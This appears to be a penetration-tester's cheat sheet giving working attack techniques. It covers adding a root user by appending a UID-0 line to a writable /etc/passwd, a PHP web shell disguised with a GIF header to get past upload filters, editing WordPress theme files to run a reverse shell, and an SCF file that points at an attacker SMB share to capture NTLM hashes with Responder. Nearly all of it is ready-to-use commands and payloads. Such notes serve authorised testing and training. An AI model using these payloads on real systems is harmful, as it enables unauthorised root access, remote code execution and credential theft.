
# /etc/passwd Writable

Create New Root User
```
openssl passwd passwordofchoice > generatedhash

Create new user via append to /etc/passwd:
echo "username:generatedhash:0:0:userdisplayname:/root:/bin/bash" >> /etc/passwd
```

# File Upload Bypass

## General Notes

Brute Force Relevant File Extensions
```
Get a list of all file extensions used by or associated with the web server and it's language or tech stack.

For example, IIS/ASP will contain things like .config, .aspx, etc.
Official Microsoft Reference:
https://msdn.microsoft.com/en-us/library/2wawkw1c.aspx

Use Burp Suite Intruder to brute force uploading a file with all the different extensions.
```

## Image Upload Bypass

Change the Content-Type Header to the Expected Type
```
Convert between Content Types:
application/x-php
and
image/jpeg
etc.
```

Use Fake Gif with File Header (file.gif)
```
GIF89;
<?php echo system($_REQUEST['c']); ?>
```

# HTTP

## WordPress

Edit an active template page (e.g., 404.php) to execute a reverse shell or web shell to send a reverse shell.
```
Appearance > Editor > page.php

Execute the file:
http://target/wordpress/wp-content/themes/themenamenospaces/page.php
```

# SMB

SCF (Shell Command Files)

```
Start responder: sudo responder -v -I interface

(Note: Filename starts with @ to bring file to top of directory listing)
Contents of @test.scf:

[Shell]
Command=2
IconFile=\\attacker\share\test.ico
[Taskbar]
Command=ToggleDesktop

Deliver file.

When user opens file, an SMB connection will be made to the attacker, which should be captured by responder, revealing an NTLM hash.
```